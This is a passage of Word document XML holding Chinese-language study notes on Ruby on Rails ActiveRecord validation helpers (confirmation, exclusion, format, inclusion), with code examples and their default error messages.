              </w:rPr>
              <w:t>text_field :person, :email_confirmation</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7AB5195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4D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">该校验只有当 </w:t>
      </w:r>
      <w:r w:rsidRPr="004D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>email_confirmation</w:t>
      </w:r>
      <w:r w:rsidRPr="004D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="004D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候才执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">所以为了确保该校验被执行，我们需要为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>email_confirmation</w:t>
      </w:r>
      <w:r w:rsidRPr="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 添加 presence 校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(稍后我们会介绍 presence 校验)。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7BF1A457" w14:textId="77777777" w:rsidTr="004D0128">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="109AF6C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23F9083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6542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validates :email, :confirmation</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23BD892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6542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validates :email_confirmation, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3943DFE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03A8E6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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>doesn’t match confirmation</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6174BA96" w14:textId="5E11DC31"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3.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>exclusion</w:t>
      </w:r>
      <w:r w:rsidR="009A3259">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 排除、没包含在里面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5626F1C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 helper 用来验证</w:t>
      </w:r>
      <w:r w:rsidRPr="00376C4D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>属性的值没有包含在给定的集合中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。用来校验的集合可以是任意实现了 enumerable 接口的对象。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8136"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="110B213B" w14:textId="77777777" w:rsidTr="009A3259">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F16F72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Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F14570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xml:space="preserve">  validates :subdomain, </w:t>
            </w:r>
            <w:r w:rsidRPr="00AE0771">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:exclusion</w:t>
            </w:r>
            <w:r w:rsidRPr="00AE0771">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AE0771">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; { :in</w:t>
            </w:r>
            <w:r w:rsidRPr="00AE0771">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AE0771">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; %w(www us ca jp)</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A5C7D4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:message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Subdomain %{value} is reserved."</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793F6B7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3069C49"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AE0771">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>exclusin</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE0771">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE0771">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:in</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE0771">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定一个集合</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，用来验证属性的取值不包含在该集合中。你也可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:in</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项的别名 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:within</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。上面的例子使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来演示了你可以在错误信息中引用属性的值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA6A42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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is reserved</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F3CA3A" w14:textId="126A8020"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3.5 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>format</w:t>
      </w:r>
      <w:r w:rsidR="000A3940">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F5180E">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>输入</w:t>
      </w:r>
      <w:r w:rsidR="000A3940">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字符串格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A1E20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该校验用来验证该属性值是否匹配通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF4C5F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:with</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF4C5F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项指定的正则表达式</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136"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="17B17F48" w14:textId="77777777" w:rsidTr="00BF4C5F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A69AB1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Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22D49AAC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="00BF4C5F" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  validates :legacy_code, </w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:format</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; { :with</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; /\A[a-zA-Z]+\z/,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="513E76C0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>    :message</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "Only letters allowed"</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4C5F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="645E7B6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F6CA49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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is invalid</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F391AB" w14:textId="498230E4"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3.6 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>inclusion</w:t>
      </w:r>
      <w:r w:rsidR="000A3940">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包含在集合中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C28324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该校验用来验证</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE1FEC">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>属性的值是否包含在给定的集合中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该集合可以是任何实现了enumerable 接口的对象。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="73F675D2" w14:textId="77777777" w:rsidTr="00CE1FEC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D1D898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Coffee &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6131379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xml:space="preserve">  validates :size, </w:t>
            </w:r>
            <w:r w:rsidRPr="00CE1FEC">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:inclusion</w:t>
            </w:r>
            <w:r w:rsidRPr="00CE1FEC">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CE1FEC">
              <w:rPr>
